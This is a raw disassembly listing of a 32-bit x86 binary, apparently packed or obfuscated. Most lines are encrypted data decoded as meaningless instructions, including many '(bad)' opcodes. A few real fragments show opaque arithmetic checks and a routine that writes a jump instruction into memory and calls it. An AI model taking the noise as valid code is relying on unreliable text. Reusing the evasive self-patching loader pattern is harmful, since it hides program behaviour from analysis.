  4100f5:	cli    
  4100f6:	add    BYTE PTR [ebx+0x1e61389e],bl
  4100fc:	shl    edi,1
  4100fe:	ret    0x9f9f
  410101:	repnz xor al,0xf0
  410104:	push   ds
  410105:	add    BYTE PTR [edx+0x55ab2afb],ah
  41010b:	test   edx,ecx
  41010d:	bsr    ebp,DWORD PTR [esi+0x39]
  410111:	clc    
  410112:	ja     0x4100c6
  410114:	jbe    0x410185
  410116:	shl    BYTE PTR [ebp+0x3accfe1f],1
  41011c:	push   cs
  41011d:	xlat   BYTE PTR ds:[ebx]
  41011e:	push   0x2ba991d0
  410123:	mov    ah,0x54
  410125:	test   eax,0xed04c046
  41012a:	push   es
  41012b:	dec    ebx
  41012c:	xor    al,0x88
  41012e:	(bad)  
  41012f:	sub    esi,ebp
  410131:	mov    ebx,0xbe70858b
  410136:	std    
  410137:	cmp    al,0x40
  410139:	(bad)  
  41013b:	test   DWORD PTR [edi],ebp
  41013d:	sbb    BYTE PTR [eax+0x58],bh
  410140:	(bad)  
  410141:	inc    edx
  410142:	xchg   ebp,eax
  410143:	sbb    al,0x96
  410145:	mov    eax,0xe5cb6ed
  41014a:	sub    eax,0xe78dda65
  41014f:	adc    al,0xa1
  410151:	or     bl,dh
  410153:	leave  
  410154:	mov    eax,0x6c3a82a7
  410159:	(bad)  
  41015a:	mov    dl,0x8d
  41015c:	add    ah,BYTE PTR [esi+0x63]
  41015f:	iret   
  410160:	xlat   BYTE PTR ds:[ebx]
  410161:	test   al,0xf9
  410163:	push   ds
  410164:	adc    eax,DWORD PTR [ebx+0x4bb64b89]
  41016a:	fbstp  TBYTE PTR [edi+0x1]
  41016d:	mov    bh,0xf6
  41016f:	jb     0x41013a
  410171:	add    eax,0xc793b264
  410176:	inc    ebp
  410177:	out    dx,eax
  410178:	pusha  
  410179:	data16 cmc 
  41017b:	scas   al,BYTE PTR es:[edi]
  41017c:	jo     0x4101a4
  41017e:	inc    edi
  41017f:	cmp    ah,0x7
  410182:	push   eax
  410183:	jo     0x410197
  410185:	lea    esp,[esi-0x2975cd97]
  41018b:	pop    esi
  41018c:	jp     0x41011b
  41018e:	mov    ch,0x58
  410190:	sti    
  410191:	inc    ebp
  410192:	stc    
  410193:	addr16 jno 0x410154
  410196:	icebp  
  410197:	mov    al,ds:0x3db97ecc
  41019c:	enter  0xdba7,0x56
  4101a0:	xchg   esp,eax
  4101a1:	call   0x21902bc2
  4101a6:	add    DWORD PTR ds:0xa9dda66d,ebp
  4101ac:	sub    eax,0xb7ac958
  4101b1:	(bad)  
  4101b2:	pop    esi
  4101b3:	ror    ah,0x2b
  4101b6:	or     al,BYTE PTR [ebx]
  4101b8:	fistp  WORD PTR [edx]
  4101ba:	loop   0x4101b9
  4101bc:	loop   0x4101bd
  4101be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101bf:	or     al,0x68
  4101c1:	lods   eax,DWORD PTR ds:[esi]
  4101c2:	pop    eax
  4101c3:	dec    esp
  4101c4:	sub    BYTE PTR [ebx+0xd2c35f6],ah
  4101ca:	jae    0x410186
  4101cc:	pop    es
  4101cd:	cmp    DWORD PTR [esi-0x69],eax
  4101d0:	cdq    
  4101d1:	addr16 inc ebx
  4101d3:	stos   BYTE PTR es:[edi],al
  4101d4:	(bad)  
  4101d5:	mov    al,BYTE PTR [ebx-0x47]
  4101d8:	cli    
  4101d9:	mul    DWORD PTR [ebx*2+0x7212ba79]
  4101e0:	(bad)  
  4101e1:	push   esp
  4101e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e3:	jns    0x410211
  4101e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101e6:	push   0x5b9d0ec0
  4101eb:	xchg   ecx,eax
  4101ec:	mov    ebx,0x9814f8d3
  4101f1:	mov    esi,0xe17a4a1c
  4101f6:	push   esp
  4101f7:	bnd jb 0x410262
  4101fa:	and    DWORD PTR [ebx-0x74],esi
  4101fd:	dec    edi
  4101fe:	sub    ch,al
  410200:	cmp    BYTE PTR [edi-0x26],0xf7
  410204:	ins    BYTE PTR es:[edi],dx
  410205:	dec    edx
  410206:	test   eax,0x1c8b3b71
  41020b:	jl     0x4101f2
  41020d:	loopne 0x4101df
  41020f:	add    edx,0x42
  410212:	fs (bad) 
  410215:	iret   
  410216:	sbb    eax,0x3f8501ff
  41021b:	(bad)
  41021e:	ret    0x77ca
  410221:	xchg   ebp,eax
  410222:	xchg   edx,eax
  410223:	out    dx,al
  410224:	jne    0x41065f
  41022a:	mov    ecx,DWORD PTR [ebp-0x78]
  41022d:	xor    edx,edx
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422598
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422598
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x4226a0
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422698],eax
  4102bc:	inc    DWORD PTR ds:0x4226a0
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	mov    ds:0xc3709f92,al
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x97181814
  410319:	stc    
  41031a:	xor    BYTE PTR ss:[esp+esi*4],cl
  41031e:	mov    cl,0xcc
  410320:	pop    ss
  410321:	or     eax,0xe41c2f3a
  410326:	daa    
  410327:	ja     0x410320
  410329:	ss push edi
  41032b:	cmp    ah,BYTE PTR [ebx+0x18]
  41032e:	xlat   BYTE PTR ds:[ebx]
  41032f:	imul   ecx,DWORD PTR [edi],0x1c
  410332:	rol    esp,1
  410334:	pop    ebp
  410335:	pop    esi
  410336:	mov    DWORD PTR [esi-0x28e5fb0d],esp
  41033c:	cmp    esi,DWORD PTR [eax+ebp*4]
  41033f:	jmp    0x8dd1:0x7b07f664
  410346:	jle    0x4102d3
  410348:	mov    ebx,0x1b035182
  41034d:	call   esi
  41034f:	jbe    0x41030c
  410351:	lds    esi,FWORD PTR [ebx-0x701815c8]
  410357:	mov    ebp,0x39bd9e71
  41035c:	inc    esp
  41035d:	int3   
  41035e:	out    0xf5,eax
  410360:	pop    ds
  410361:	push   esp
  410362:	push   eax
  410363:	pop    edx
  410364:	loop   0x410365
  410366:	rcr    DWORD PTR [edx],cl
  410368:	xor    eax,0x10a8a660
  41036d:	adc    al,0x1c
  41036f:	popa   
  410370:	ret    0x81f0
  410373:	cmp    al,0xef
  410375:	ds retf 0x75d8
  410379:	inc    esp
  41037a:	jecxz  0x410312
  41037c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41037d:	xor    al,0xa
  41037f:	mov    ds:0xc4e105bb,eax
  410384:	inc    eax
  410385:	mov    al,ds:0x98a95698
  41038a:	lds    ebp,FWORD PTR [ecx]
  41038c:	jle    0x41035a
  41038e:	adc    dl,BYTE PTR [edi-0x5d]
  410391:	push   ds
  410392:	xor    al,0x54
  410394:	push   0xa4ed3817
  410399:	cmp    eax,0xae99cfe3
  41039e:	inc    ebx
  41039f:	shr    BYTE PTR [esp+ebx*1-0x1a],0x3d
  4103a4:	int3   
  4103a5:	pushf  
  4103a6:	stos   BYTE PTR es:[edi],al
  4103a7:	fsub   DWORD PTR [ebx+edx*8-0x41672fbc]
  4103ae:	nop
  4103af:	inc    esp
  4103b0:	sub    esp,ebx
  4103b2:	xchg   ebx,eax
  4103b3:	shl    DWORD PTR [eax],0x37
  4103b6:	sub    al,0xf5
  4103b8:	jno    0x41041c
  4103ba:	test   BYTE PTR [esi],ah
  4103bc:	add    DWORD PTR [ebp+0x3e],edx
  4103bf:	jl     0x4103c0
  4103c1:	jb     0x410409
  4103c3:	js     0x41036a
  4103c5:	xchg   DWORD PTR ds:0x7a8d54e2,edi
  4103cb:	and    eax,0x7124b87
  4103d0:	enter  0x4f61,0xc7
  4103d4:	mov    esi,DWORD PTR [edi-0x17]
  4103d7:	repz sbb ebx,DWORD PTR [ebp+0x5e]
  4103db:	jle    0x4103b3
  4103dd:	ror    DWORD PTR ds:0x5bbfc286,cl
  4103e3:	or     eax,0x8b095550
  4103e8:	and    bl,al
  4103ea:	inc    edx
  4103eb:	and    esi,DWORD PTR [esi-0x2c]
  4103ee:	xchg   BYTE PTR [edx-0x35],bl
  4103f1:	jno    0x410390
  4103f3:	popa   
  4103f4:	jb     0x410414
  4103f6:	jge    0x410420
  4103f8:	adc    ebp,DWORD PTR [edx]
  4103fa:	or     ecx,DWORD PTR ds:0xcfa8206f
  410400:	mov    dl,0x2a
  410402:	repz xlat BYTE PTR gs:[ebx]
  410405:	mov    esp,0xc582e431
  41040a:	or     BYTE PTR [edi-0x6e],bl
  41040d:	call   edx
  41040f:	xchg   edi,eax
  410410:	(bad)  
  410411:	push   esp
  410412:	rcl    ecx,0xd1
  410415:	ins    BYTE PTR es:[edi],dx
  410416:	pop    ds
  410417:	stos   DWORD PTR es:[edi],eax
  410418:	js     0x410485
  41041a:	push   ss
  41041b:	sahf   
  41041c:	pop    ebp
  41041d:	xchg   ebx,eax
  41041e:	and    edi,ebx
  410420:	pop    ebx
  410421:	xor    dl,BYTE PTR [edi+0x69]
  410424:	es dec ebp
  410426:	adc    DWORD PTR [edx],edx
  410428:	fstp   TBYTE PTR [edx]
  41042a:	add    DWORD PTR [esi+0x6],0xffffffdd
  41042e:	stos   BYTE PTR es:[edi],al
  41042f:	inc    edx
  410430:	fst    DWORD PTR [ecx+0x59e42e2]
  410436:	ss dec eax
  410438:	xchg   esi,eax
  410439:	pusha  
  41043a:	mov    al,0x97
  41043c:	cdq    
  41043d:	cmp    dh,BYTE PTR ds:0x9a943817
  410443:	adc    DWORD PTR [edx-0x7a],0xdae36d1a
  41044a:	pop    ds
  41044b:	xchg   edx,eax
  41044c:	xchg   ecx,eax
  41044d:	arpl   cx,ax
  41044f:	lahf   
  410450:	dec    ebp
  410451:	jl     0x410486
  410453:	aas    
  410454:	nop
  410455:	mov    cl,0x0
  410457:	jnp    0x410495
  410459:	hlt    
  41045a:	xor    ah,al
  41045c:	add    eax,0x14b352f8
  410461:	pop    ss
  410462:	pop    edx
  410463:	popf   
  410464:	ja     0x410416
  410466:	je     0x4104de
  410468:	pop    esp
  410469:	mov    esp,0xf7b6bff4
  41046e:	xchg   ebx,eax
  41046f:	in     al,0x65
  410471:	das    
  410472:	mov    WORD PTR [ebx+0x1b3fcd8d],gs
  410478:	out    0x41,eax
  41047a:	push   cs
  41047b:	rcr    DWORD PTR [ebx-0x4f],0x20
  41047f:	dec    edi
  410480:	add    ebp,eax
  410482:	mov    bl,0x98
  410484:	jp     0x4104f3
  410486:	sbb    al,BYTE PTR [edx-0x1aaf339]
  41048c:	cdq    
  41048d:	pushf  
  41048e:	in     al,dx
  41048f:	cmp    edi,DWORD PTR ds:0xc1010a4f
  410495:	aam    0x5d
  410497:	adc    DWORD PTR [edx+0x67],ebx
  41049a:	adc    al,0x1e
  41049c:	mov    ch,0x64
  41049e:	aam    0x6b
  4104a0:	loop   0x410466
  4104a2:	xchg   ah,bh
  4104a4:	sbb    al,0x55
  4104a6:	jae    0x4104f2
  4104a8:	inc    ebx
  4104a9:	jl     0x4104a6
  4104ab:	imul   esp,DWORD PTR [eax],0xfffffff7
  4104ae:	int    0x13
  4104b0:	loope  0x410466
  4104b2:	sbb    BYTE PTR [edx-0x443cea83],bh
  4104b8:	mov    edx,edx
  4104ba:	stos   DWORD PTR es:[edi],eax
  4104bb:	or     cl,dh
  4104bd:	xchg   DWORD PTR [edi+0x2d],esi
  4104c0:	repz dec ebp
  4104c2:	jg     0x410482
  4104c4:	nop
  4104c5:	daa    
  4104c6:	push   edi
  4104c7:	push   esi
  4104c8:	imul   edx,DWORD PTR [edi-0x4888627a],0x2666cf22
  4104d2:	stos   DWORD PTR es:[edi],eax
  4104d3:	pop    eax
  4104d4:	jecxz  0x4104a7
  4104d6:	inc    ebp
  4104d7:	gs mov esi,ebx
  4104da:	arpl   WORD PTR [esi-0x60],bx
  4104dd:	arpl   WORD PTR [ebx],dx
  4104df:	(bad)  
  4104e0:	dec    esi
  4104e1:	fwait
  4104e2:	aad    0x83
  4104e4:	mov    eax,0xe932bc86
  4104e9:	loop   0x4104ed
  4104eb:	mov    edi,0xa8c678e1
  4104f0:	or     edx,DWORD PTR [ecx+0x1]
  4104f3:	mov    edx,0x71fc1e4d
  4104f8:	js     0x410569
  4104fa:	and    BYTE PTR [ebx],bh
  4104fc:	lods   eax,DWORD PTR ds:[esi]
  4104fd:	stc    
  4104fe:	in     eax,0x29
  410500:	dec    esi
  410501:	mov    es,eax
  410503:	jl     0x41051e
  410505:	test   DWORD PTR [edi+0x50],eax
  410508:	cmp    cl,BYTE PTR [ebx-0x5aa0f6df]
  41050e:	inc    eax
  41050f:	cli    
  410510:	cs pop ds
  410512:	mov    bh,0x54
  410514:	lds    edx,FWORD PTR [edi+edi*8-0x62]
  410518:	imul   ecx
  41051a:	popf   
  41051b:	pop    esp
  41051c:	add    eax,0x4a96fc0e
  410521:	mov    ebx,0xf9cfda7d
  410526:	pop    ds
  410527:	jno    0x41053c
  410529:	mov    bh,0x8e
  41052b:	lea    esi,[edi-0xc8fa480]
  410531:	jmp    0x4104f4
  410533:	xor    esi,DWORD PTR [ecx]
  410535:	(bad)  
  410536:	sub    eax,0x6be65e9f
  41053b:	fwait
  41053c:	in     eax,0xfc
  41053e:	fcomp  st(7)
  410540:	jecxz  0x41056f
  410542:	scas   al,BYTE PTR es:[edi]
  410543:	(bad)  
  410544:	jmp    0x7bdf6c05
  410549:	lock lock in eax,dx
  41054c:	popf   
  41054d:	loopne 0x410574
  41054f:	mov    ds:0xeb205e1b,eax
  410554:	in     al,0x26
  410556:	pop    esp
  410557:	sbb    ah,BYTE PTR [eax-0x64]
  41055a:	mov    esi,0x1880a448
  41055f:	add    eax,0x505ecda5
  410564:	jmp    FWORD PTR [eax+0x6e]
  410567:	(bad)  
  410568:	jo     0x410508
  41056a:	bound  edx,QWORD PTR [ebx+0x3ee08f50]
  410570:	jnp    0x410533
  410572:	pop    esp
  410573:	imul   eax,DWORD PTR [ebx-0x78],0xffffff81
  410577:	lock lds ebx,FWORD PTR [edx]
  41057a:	mov    ah,bl
  41057c:	or     BYTE PTR [edi+0x9],0x1b
  410580:	cmp    esi,DWORD PTR [ecx-0x6b]
  410583:	das    
  410584:	xor    bl,BYTE PTR [ebp-0x60]
  410587:	push   ss
  410588:	push   0x96595ebe
  41058d:	daa    
  41058e:	sahf   
  41058f:	(bad)  
  410591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410592:	or     al,0x8e
  410594:	jge    0x41060c
  410596:	sti    
  410597:	fcomip st,st(3)
  410599:	sub    DWORD PTR [edi+ecx*4+0x7b9c3a63],ebp
  4105a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105a1:	push   0x1cba78fd
  4105a6:	lds    edi,FWORD PTR [eax-0x32]
  4105a9:	mov    dh,0x83
  4105ab:	lahf   
  4105ac:	ss popa 
  4105ae:	iret   
  4105af:	add    BYTE PTR [ebp+eax*1-0x89b96c6],ah
  4105b6:	mov    esi,0x504f461c
  4105bb:	cmp    BYTE PTR [ebp+0x154c8012],0x80
  4105c2:	sbb    BYTE PTR [ebp+0x56d3ce8a],ch
  4105c8:	jmp    0x6485:0x89f0458d
  4105cf:	(bad)  
  4105d0:	(bad)  
  4105d1:	dec    DWORD PTR [ebx+0x4589ac45]
  4105d7:	lock mov eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422414
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422688
  410612:	push   DWORD PTR ds:0x42241c
  410618:	push   DWORD PTR ds:0x422668
  41061e:	push   DWORD PTR ds:0x4226dc
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422598
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	in     al,0x60
  4106ee:	fstp   TBYTE PTR [esi+0x68]
  4106f1:	mov    ds,WORD PTR [eax]
  4106f3:	sbb    BYTE PTR [edx-0x71e7e7ec],bl
  4106f9:	inc    eax
  4106fa:	daa    
  4106fb:	stc    
  4106fc:	jecxz  0x41075a
  4106fe:	loopne 0x4106dc
  410700:	add    al,0x32
  410702:	stos   DWORD PTR es:[edi],eax
  410703:	scas   al,BYTE PTR es:[edi]
  410704:	lea    ebp,[edx-0x45]
  410707:	call   0xb90847a1
  41070c:	pop    esp
  41070d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41070e:	xor    al,cl
  410710:	js     0x41075d
  410712:	mov    bl,0x46
  410714:	shl    BYTE PTR [eax-0x79],0xf3
  410718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410719:	or     BYTE PTR [ecx-0x558b3cee],dh
  41071f:	jg     0x410727
  410721:	sbb    BYTE PTR [ecx+ebp*4],bh
  410724:	sub    BYTE PTR ss:[ecx+eiz*4],dl
  410728:	in     eax,dx
  410729:	stc    
  41072a:	ins    BYTE PTR es:[edi],dx
  41072b:	mov    al,0xfd
  41072d:	push   ebp
  41072e:	shl    BYTE PTR [ebx-0x11],cl
  410731:	xchg   ebx,eax
  410732:	out    dx,al
  410733:	inc    esi
  410734:	sub    DWORD PTR [ebx-0x56],ebp
  410737:	inc    ecx
  410738:	rol    DWORD PTR [ecx+0x6a8da625],cl
  41073e:	push   edx
  41073f:	loopne 0x4107b4
  410741:	inc    edx
  410742:	mov    cl,0xb
  410744:	add    al,0x62
  410746:	scas   al,BYTE PTR es:[edi]
  410747:	or     eax,0xe7a83ab4
  41074c:	mov    esi,0x15a4991d
  410751:	jmp    0x85bb:0xb1d2d3d4
  410758:	(bad)  
  410759:	jmp    0x16b2e99
  41075e:	dec    eax
  41075f:	dec    ebx
  410760:	out    dx,eax
  410761:	xchg   esi,eax
  410762:	ins    DWORD PTR es:[edi],dx
  410763:	(bad)  
  410764:	stos   BYTE PTR es:[edi],al
  410765:	fs dec eax
  410767:	pop    esi
  410768:	ss dec edi
  41076a:	cmp    al,0x32
  41076c:	mov    edi,0x48458fe7
  410771:	lahf   
  410772:	pop    edx
  410773:	pop    ds
  410774:	(bad)  
  410775:	and    al,0x69
  410777:	push   0xfcf10539
  41077c:	pusha  
  41077d:	mov    ah,0xa2
  41077f:	mov    dh,0xf9
  410781:	inc    ebp
  410782:	call   0xa5ed:0x49da2345
  410789:	aam    0x2
  41078b:	or     BYTE PTR [ebp+0x2],al
  41078e:	and    DWORD PTR [edi+0x67],ebx
  410791:	lahf   
  410792:	icebp  
  410793:	xchg   edi,eax
  410794:	jmp    0x41077d
  410796:	loop   0x4107d9
  410798:	pop    ecx
  410799:	fs (bad) 
  41079b:	ins    BYTE PTR es:[edi],dx
  41079c:	into   
  41079d:	hlt    
  41079e:	push   esp
  41079f:	jp     0x4107d8
  4107a1:	mov    dl,0x9b
  4107a3:	sub    al,0xa5
  4107a5:	clc    
  4107a6:	mov    cl,0xa7
  4107a8:	pop    esp
  4107a9:	mov    eax,ds:0x1a0989ec
  4107ae:	lea    ebp,[eax+eiz*1+0x18]
  4107b2:	push   ebx
  4107b3:	sbb    eax,0x553189f7
  4107b8:	dec    ebx
  4107b9:	xchg   edi,eax
  4107ba:	dec    BYTE PTR [edx+0x4c]
  4107bd:	lds    eax,FWORD PTR [ecx+0x741b48c9]
  4107c3:	jo     0x410748
  4107c5:	sub    bh,BYTE PTR [ebp-0x78159b75]
  4107cb:	mov    dh,0x76
  4107cd:	mov    cl,0xa3
  4107cf:	push   eax
  4107d0:	pop    ecx
  4107d1:	mov    BYTE PTR [eax+esi*1],ch
  4107d4:	push   edi
  4107d5:	push   esp
  4107d6:	jle    0x41083c
  4107d8:	jns    0x4107ea
  4107da:	mov    ch,BYTE PTR [eax+0x3e]
  4107dd:	jmp    0xc79a:0x2d4d0bcf
  4107e4:	(bad)  
  4107e5:	aad    0xbc
  4107e7:	adc    BYTE PTR [edx*4+0x55a4850d],dh
  4107ee:	mov    DWORD PTR [eax],eax
  4107f0:	xor    BYTE PTR [edi],ch
  4107f2:	cs daa 
  4107f4:	xor    DWORD PTR [edx],esi
  4107f6:	jnp    0x410814
  4107f8:	sti    
  4107f9:	icebp  
  4107fa:	pop    es
  4107fb:	mov    ah,0xd5
  4107fd:	les    esp,FWORD PTR [eax-0x11c0e06b]
  410803:	mov    ah,al
  410805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410806:	inc    ebp
  410807:	pop    eax
  410808:	xor    BYTE PTR [edi+0x2f],ah
  41080b:	jnp    0x410865
  41080d:	pop    ebx
  41080e:	repnz dec esi
  410810:	popf   
  410811:	aam    0x17
  410813:	xchg   esp,eax
  410814:	pop    ecx
  410815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410816:	je     0x41085d
  410818:	push   edi
  410819:	rcr    ah,cl
  41081b:	(bad)  
  41081d:	std    
  41081e:	mov    ch,0xf3
  410821:	je     0x4107f8
  410823:	mov    bh,0x58
  410825:	cdq    
  410826:	(bad)  
  410827:	sub    edi,DWORD PTR [edx+0x322fb917]
  41082d:	es enter 0x5e03,0x86
  410832:	push   ecx
  410833:	pushf  
  410834:	sbb    ch,BYTE PTR [edx+0x41266023]
  41083a:	cld    
  41083b:	sbb    DWORD PTR [edi+0x6da79ef6],0x584e0a4
  410845:	add    DWORD PTR [esi+0x45],ebp
  410848:	add    DWORD PTR [esi+0x1a358e82],esp
  41084e:	mov    ecx,0xb78248df
  410853:	shr    BYTE PTR [eax-0x7c07f687],0x4a
  41085a:	xchg   ebp,eax
  41085b:	call   0x373a:0x890c4b4e
  410862:	mov    ecx,0xd70fdc48
  410867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410868:	ret    0xd161
  41086b:	dec    esp
  41086c:	jp     0x41085d
  41086e:	jbe    0x41083a
  410870:	push   ebx
  410871:	outs   dx,DWORD PTR ds:[esi]
  410872:	sbb    BYTE PTR [eax+0x40d6f485],cl
  410878:	mov    ebx,0x3b0dffd2
  41087d:	sbb    DWORD PTR [edx-0x42678d42],0x0
  410884:	aad    0xb
  410886:	fild   WORD PTR [ebx]
  410888:	inc    edi
  410889:	and    ebx,DWORD PTR [esi+0x34]
  41088c:	ins    DWORD PTR es:[edi],dx
  41088d:	dec    eax
  41088e:	sub    BYTE PTR [edx],0x52
  410891:	jg     0x4108a4
  410893:	or     DWORD PTR [ebx],edi
  410895:	lods   al,BYTE PTR ds:[esi]
  410896:	add    esp,esp
  410898:	mov    ebp,0xaf85993
  41089d:	test   al,0x40
  41089f:	(bad)  
  4108a0:	arpl   bx,bx
  4108a2:	push   DWORD PTR [ecx]
  4108a4:	aad    0x6c
  4108a6:	outs   dx,DWORD PTR ds:[esi]
  4108a7:	mov    eax,ds:0x7cefc719
  4108ac:	push   esi
  4108ad:	je     0x410899
  4108af:	dec    eax
  4108b0:	icebp  
  4108b1:	jmp    0x6026e080
  4108b6:	leave  
  4108b7:	xchg   ebp,eax
  4108b8:	ror    DWORD PTR ds:0xdc15c45b,1
  4108be:	mov    esi,DWORD PTR [edx-0x6]
  4108c1:	cmp    al,0x53
  4108c3:	nop
  4108c4:	data16 fist WORD PTR [ecx+0x2e]
  4108c8:	pop    edi
  4108c9:	cmp    eax,0x41252148
  4108ce:	dec    ebp
  4108cf:	test   al,0x18
  4108d1:	xchg   ebp,eax
  4108d2:	cwde   
  4108d3:	dec    esp
  4108d4:	mov    ebp,esi
  4108d6:	out    dx,eax
  4108d7:	push   ds
  4108d8:	sbb    eax,0x2b279c95
  4108dd:	in     al,0x96
  4108df:	jnp    0x41093a
  4108e1:	inc    edi
  4108e2:	lahf   
  4108e3:	xor    ah,BYTE PTR [edi+ebp*4+0x40]
  4108e7:	clc    
  4108e8:	out    0xf3,eax
  4108ea:	mov    ecx,DWORD PTR [eax+0x470e2c9b]
  4108f0:	jl     0x410941
  4108f2:	je     0x4108a7
  4108f4:	or     BYTE PTR [eax-0x42a0925d],bl
  4108fa:	iret   
  4108fb:	xchg   esi,eax
  4108fc:	je     0x410890
  4108fe:	stos   BYTE PTR es:[edi],al
  4108ff:	xor    al,0xdf
  410901:	push   esp
  410902:	int    0x41
  410904:	sub    BYTE PTR [edx],bl
  410906:	inc    ebx
  410907:	and    edi,DWORD PTR [ecx+ebp*4]
  41090a:	mov    esp,0x567ed1a1
  41090f:	aad    0x5d
  410911:	mov    al,ds:0xf304413c
  410916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410917:	in     al,dx
  410918:	mov    eax,ds:0x770e334c
  41091d:	jae    0x4108ea
  41091f:	sub    eax,0xc35bb948
  410924:	nop
  410925:	dec    ecx
  410926:	sahf   
  410927:	pop    eax
  410928:	scas   eax,DWORD PTR es:[edi]
  410929:	dec    ebx
  41092a:	add    al,0x8e
  41092c:	push   ebx
  41092d:	jb     0x4108e9
  41092f:	push   eax
  410930:	push   ebx
